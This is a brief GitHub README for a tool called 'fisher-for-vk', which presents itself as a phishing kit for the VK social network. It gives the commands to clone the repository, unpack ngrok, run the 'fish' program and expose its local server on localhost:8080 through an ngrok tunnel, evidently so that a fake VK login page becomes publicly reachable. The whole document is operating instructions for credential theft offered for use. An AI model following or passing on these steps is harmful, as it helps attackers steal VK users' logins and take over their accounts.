# fisher-for-vk
Social Network VK Fisher and Ngrok
## HOW TO USE
```/bin/bash
git clone https://github.com/Hyperion-Corporation/fisher-for-vk/
tar -xvf ngrok.tar.gz
chmod +x fish
chmod +x ngrok
./fish
run
```
## OPEN A NEW TERMINAL
```
./ngrok http http://localhost:8080
```
